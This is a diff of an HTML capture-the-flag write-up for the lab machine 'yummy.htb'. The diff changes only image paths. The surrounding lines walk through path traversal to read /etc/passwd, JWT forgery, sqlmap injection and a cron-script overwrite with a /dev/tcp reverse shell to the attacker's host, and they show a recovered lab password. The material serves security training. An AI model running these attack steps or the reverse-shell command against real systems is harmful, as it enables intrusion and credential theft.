@@ -45,7 +45,7 @@
           </div>
         </header>
         <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
-<p><img src="/_resources/6b1551c074a745f68cb51068f1eeaf70.png" /></p>
+<p><img src=":/6b1551c074a745f68cb51068f1eeaf70" alt="0508ee9f5467fcae75dadec730199038.png" /></p>
 <div><pre class="hljs"><code>whatweb yummy.htb
 http://yummy.htb <span class="hljs-comment">[200 OK]</span> Bootstrap, Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, Email<span class="hljs-comment">[info@yummy.htb]</span>, Frame, HTML5, HTTPServer<span class="hljs-comment">[Caddy]</span>, IP<span class="hljs-comment">[10.129.231.153]</span>, Lightbox, Script, Title<span class="hljs-comment">[Yummy]</span></code></pre></div>
 <div><pre class="hljs"><code><span class="hljs-variable">$sudo</span> nmap -p- -A <span class="hljs-number">10.129</span>.<span class="hljs-number">231.153</span>
@@ -57,9 +57,9 @@ PORT   STATE SERVICE VERSION
 <span class="hljs-number">80</span>/tcp open  http    Caddy httpd
 |_http-<span class="hljs-symbol">title:</span> Did <span class="hljs-keyword">not</span> follow redirect to <span class="hljs-symbol">http:</span>//yummy.htb/
 No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see <span class="hljs-symbol">https:</span>//nmap.org/submit/ ).</code></pre></div>
-<p><img src="/_resources/a941283caa844fd9b4c888babb434edc.png" /></p>
+<p><img src=":/a941283caa844fd9b4c888babb434edc" alt="7163ad5c84b48b2f56bf4fa1b2ad2286.png" /></p>
 <p>We can find reservation feature, that actaully works. Creating a reservation, tells us that we can menage it in our account. Strannge, as I did not create one yet, but sure.</p>
-<p><img src="/_resources/f5a231ab878942438d89b3d3f3212ef3.png" /></p>
+<p><img src=":/f5a231ab878942438d89b3d3f3212ef3" alt="b265626453257edc76e5bf1a6e8ac6d8.png" /></p>
 <div><pre class="hljs"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/book</span> <span class="hljs-meta">HTTP/1.1</span>
 <span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>yummy.htb
 <span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -93,7 +93,7 @@ No exact OS matches <span class="hljs-keyword">for</span> host (If you know what
 
 <span class="language-perl">{<span class="hljs-string">"email"</span>:<span class="hljs-string">"test@test.com"</span>,<span class="hljs-string">"password"</span>:<span class="hljs-string">"test"</span>}</span></code></pre></div>
 <p>Ater creating account and logging in, we get our dashboard with our reseration. We can also export our reservation to icalendar file.</p>
-<p><img src="/_resources/66950cbb4a2741068fc8b3a60e116256.png" /></p>
+<p><img src=":/66950cbb4a2741068fc8b3a60e116256" alt="e041c0c14c15e20763579b3d96d1fd9d.png" /></p>
 <div><pre class="hljs"><code><span class="hljs-symbol">BEGIN:</span>VCALENDAR
 <span class="hljs-symbol">VERSION:</span><span class="hljs-number">2.0</span>
 <span class="hljs-symbol">PRODID:</span>ics.py - http://git.io/lLljaA
@@ -105,10 +105,10 @@ No exact OS matches <span class="hljs-keyword">for</span> host (If you know what
 <span class="hljs-symbol">END:</span>VEVENT
 <span class="hljs-symbol">END:</span>VCALENDAR</code></pre></div>
 <p>We can see that it is being generated using <a title="https://github.com/ics-py/ics-py" href="https://github.com/ics-py/ics-py">ics.py</a>. It’s in version 0.8.0.dev0, so there might be a way to exploit it’s parsing. There are some <a title="https://www.exploit-db.com/exploits/6519" href="https://www.exploit-db.com/exploits/6519">CVE’s</a>, but none for this exact library. Looking at burp, we can see that we also get our file from <code>/export</code>.</p>
-<p><img src="/_resources/3c3f17d761d941509e40cd39a12af7e4.png" /></p>
+<p><img src=":/3c3f17d761d941509e40cd39a12af7e4" alt="6cfb61a24a6a5c7af5d624d1d08d1173.png" /></p>
 <h1 id="path-traversal">Path traversal</h1>
 <p>I tried doing simple path traversal, but to no avail. Then, looking at burp I traced how we get the icalendar file. I modified location of file that is being retrieved and got passwd. Finally something.</p>
-<p><img src="/_resources/5cd3e03f48724f918f8fda3a47f61b04.png" /></p>
+<p><img src=":/5cd3e03f48724f918f8fda3a47f61b04" alt="f075a8330ba7c64682584f027056e316.png" /></p>
 <div><pre class="hljs"><code><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
 <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
 <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span>
@@ -312,7 +312,7 @@ response=$(/usr/bin/systemctl is-active mysql)
 [ -f dbstatus.json ] &amp;&amp; /usr/bin/rm -f dbstatus.json</code></pre></div>
 <p>Does not exist on the server /data/scripts/dbstatus.json. I was trying to find .sql file, so I could not do so for an hour, so time to crack the app.</p>
 <p>In <code>/login</code> we can see how our token is created: <code>access_token = jwt.encode(payload, signature.key.export_key(), algorithm='RS256')</code>. Using <a title="https://jwt.io/" href="https://jwt.io/">jwt.io</a> we can decode it and see that it matches our expectations.</p>
-<p><img src="/_resources/1a645ca49b5f4a50b8e067e405475a80.png" /></p>
+<p><img src=":/1a645ca49b5f4a50b8e067e405475a80" alt="d84219d245c37957e175319b527b380c.png" /></p>
 <p>What is fun, is that sometimes the token is generated for me was <code>&lt;SNIP&gt;WY37Yzz6Ho46CVE</code>. Nice.</p>
 <h1 id="cracking-the-app">Cracking the app</h1>
 <p>I had no idea how JWT works, nor RS256 so had to educate myself a bit here. For a [TLDR] this is a good <a title="https://www.youtube.com/watch?v=UBUNrFtufWo" href="https://www.youtube.com/watch?v=UBUNrFtufWo">fireship video</a>. Then I’ve found <a title="https://www.youtube.com/watch?v=cZYFIipgBXg" href="https://www.youtube.com/watch?v=cZYFIipgBXg">Jan Goebel video</a> explaining RS256. It turns out it stands for RSA + SHA256. So the data is being sent as b64 encoded plain text (that is why <a title="https://jwt.io/" href="https://jwt.io/">jwt.io</a> is being able to decode it) and then at the bottom separated with a dot is attached first encrypted, then hashed message seen above. If you need a reminder of how rsa works, here is a <a title="https://www.cryptool.org/en/cto/rsa-step-by-step/" href="https://www.cryptool.org/en/cto/rsa-step-by-step/">great site</a>.</p>
@@ -430,7 +430,7 @@ jwt_token = jwt.encode(payload, private_key, algorithm=<span class="hljs-string"
 </ol>
 <p>It works! If we change our cookie, we can now access <code>/admindashboard</code> without password.</p>
 <h1 id="abusing-admin-panel">Abusing admin panel</h1>
-<p><img src="/_resources/dad4626b25fa4d91ac95a7addee98e3a.png" /></p>
+<p><img src=":/dad4626b25fa4d91ac95a7addee98e3a" alt="5f3dd3ef9483f24be528dd11da554bd5.png" /></p>
 <p>Then as we know from the source code, we can now do sql injection on the <code>o</code> parameter of <code>http://yummy.htb/admindashboard?s=a&amp;o=ASC</code>. Running SQLmap, it diagnoses it as time-based. We can retrieve <code>users</code> table.</p>
 <div><pre class="hljs"><code>Parameter: <span class="hljs-comment">#1* (URI)</span>
     Type: time-based blind
@@ -482,7 +482,7 @@ drwxr-xr-x<span class="hljs-number"> 3 </span>root  root <span class="hljs-numbe
 <div><pre class="hljs"><code><span class="hljs-attribute">mysql</span>@yummy:/data$ ls -l
 <span class="hljs-attribute">drwxrwxrwx</span> <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Oct <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">45</span> scripts</code></pre></div>
 <p>So we can just setup on our host <code>nc -lvnp 5555</code> and then run on the target <code>rm app_backup.sh &amp;&amp; echo "bash -i &gt;&amp; /dev/tcp/10.10.16.21/5555 0&gt;&amp;1" &gt; app_backup.sh</code>.</p>
-<p><img src="/_resources/fd3fa4d4d4f44b45861feccb67b27417.png" /></p>
+<p><img src=":/fd3fa4d4d4f44b45861feccb67b27417" alt="1a6f0af75bf6af83adf336db1ecb7a24.png" /></p>
 <p>We are now logged in as www-data, but we still can’t access any of the user folders. In our home directory, there is only one new folder, <code>app-qatesting</code>, owned by <code>qa</code>. In it, we can see all of the same files as in our <code>backuppapp.zip</code>, except for folder <code>.hg</code>.</p>
 <div><pre class="hljs"><code>www-data@yummy:~/app-qatesting$ ls -la
 drwxrwx---<span class="hljs-number"> 7 </span>www-data qa       <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:41 .
@@ -518,12 +518,12 @@ nc -l -p 2222 &gt; qa.zip</code></pre></div>
 <p>Looking for interesting content, we can find <code>app.py.i</code>.</p>
 <div><pre class="hljs"><code><span class="hljs-variable">$grep</span> -r <span class="hljs-string">"password"</span> ./.hg
 grep: ./.hg/store/data/app.py.i: binary file matches</code></pre></div>
-<p><img src="/_resources/5ae1fc0caefb43fc8f9a59f5cac318ac.png" /></p>
+<p><img src=":/5ae1fc0caefb43fc8f9a59f5cac318ac" alt="0c2fb5e064f896930fd4926faed03e67.png" /></p>
 <p>We finally get:<br />
 ‘user’: ‘qa’<br />
 ‘password’: ‘jPAd!XQCtn8Oc@2B’</p>
 <p>We finally get user flag.</p>
-<p><img src="/_resources/416ac844bb8c4be4b4db3f9110ffef8d.png" /></p>
+<p><img src=":/416ac844bb8c4be4b4db3f9110ffef8d" alt="4a400f8db870789603582f6dc1ba332a.png" /></p>
 <h1 id="getting-step-closer-to-root">Getting (step closer to) Root</h1>
 <p>In our home folder we can find file called <code>.hgrc</code>.</p>
 <div><pre class="hljs"><code># example <span class="hljs-keyword">user</span> config (see <span class="hljs-string">'hg help config'</span> <span class="hljs-keyword">for</span> more <span class="hljs-keyword">info</span>)
